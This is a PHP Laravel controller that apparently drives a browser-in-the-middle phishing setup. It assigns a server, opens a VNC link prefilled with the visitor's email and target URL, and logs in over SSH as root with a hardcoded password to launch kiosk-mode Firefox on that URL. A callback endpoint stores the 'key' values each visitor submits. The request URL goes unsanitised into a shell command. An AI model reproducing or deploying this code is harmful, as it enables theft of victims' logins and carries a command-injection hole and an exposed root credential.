<?php

namespace App\Http\Controllers;

use App\Models\Server;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use phpseclib3\Net\SSH2;

class ClientController extends Controller
{
    function index(Request $request) 
    {
        $server = Server::query()
            ->whereNull('used_at')
            ->whereNull('destroyed_at')
            ->where('ready', true)
            ->first();

        if(!$server && session('using_server')) 
        {
            $server = Server::query()->findOrFail(session('using_server'));
        }
        if($server && !$server->destroyed_at)
        {
            session(['using_server' => $server->id]);
            $ip = $server->server_ip;
            // dd(redirect(get_vnc_url($ip)));
            $server->update(['used_at' => now()]);
            $url = get_vnc_url($ip) . '&report_url=' . urlencode(route('client.report_user_data'));
            $url .= '&used_url=' . urlencode($request->url);
            $url .= '&used_ip=' . $ip;

            if($request->url) $url .= '&url=' . urlencode($request->url);
            if($request->email) $url .= '&email=' . urlencode($request->email);

            return view('client', [
                'url' => $url,
                'to_url' => $request->url,
                'ip' => $ip,
                'email' => $request->email,
            ]);
        }
        session(['using_server' => null]);
        return redirect(Cache::get('error_page_link') ?? 'https://google.com');
    }
    function start(Request $request) 
    {
        $ip = $request->ip;
        $url = $request->to_url;
        // if(!Cache::get($ip . '_opened'))
        // {
            $ssh = new SSH2($ip, 22);
            if (!$ssh->login('root', 'whattheFuxk1231')) {
                return abort(404);
            }
            $ssh->exec('pgrep firefox | xargs kill');
            $ssh->exec('export DISPLAY=:1 && firefox --no-sandbox --start-fullscreen --kiosk '. $url .' &');
            // $ssh->exec('export DISPLAY=:1 && firefox --no-sandbox '. $url .' &');
            Cache::forever($ip . '_opened', 1);
        // }
    }
    function report_user_data(Request $request) 
    {
        $ip = $request->ip;
        $url = $request->url;
        $email = $request->email;
        $server = Server::query()->where('server_ip', $ip)->firstOrFail();
        $user_data = $server->user_data ?? [$url];
        if($request->key)
        {
            $user_data[] = $request->key;
        }
        $server->update([
            'user_data' => $user_data
        ]);
    }
}
